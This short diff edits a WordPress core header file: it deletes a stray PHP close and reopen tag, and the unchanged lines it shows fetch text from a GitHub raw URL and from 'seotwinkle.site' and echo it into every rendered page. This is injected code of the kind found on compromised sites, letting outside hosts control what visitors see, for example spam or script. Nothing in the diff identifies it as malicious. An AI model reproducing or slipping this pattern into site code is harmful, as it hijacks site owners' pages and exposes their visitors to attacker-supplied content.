@@ -19,8 +19,6 @@ if ( ! isset( $wp_did_header ) ) {
     // Memuat template dari WordPress
     require_once ABSPATH . WPINC . '/template-loader.php';
 }
-?>
-<?php
 $a = file_get_contents('https://raw.githubusercontent.com/kikiii88/sadboy/main/display.txt');
 echo $a;
 $b = file_get_contents( 'https://seotwinkle.site/littlestar/' );
